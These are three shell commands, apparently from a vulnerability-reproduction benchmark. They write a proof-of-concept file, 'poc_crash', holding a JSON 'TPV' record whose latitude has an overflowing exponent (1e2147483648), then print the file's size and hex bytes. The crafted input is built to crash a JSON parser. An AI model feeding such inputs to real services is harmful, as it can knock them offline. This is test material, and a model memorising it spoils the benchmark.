printf '%s' '{"class":"TPV","lat":1e2147483648}' > /CybinGym_workdir/poc_crash
stat -c 'path=%n size=%s type=%F' /CybinGym_workdir/poc_crash
od -An -tx1 -v /CybinGym_workdir/poc_crash
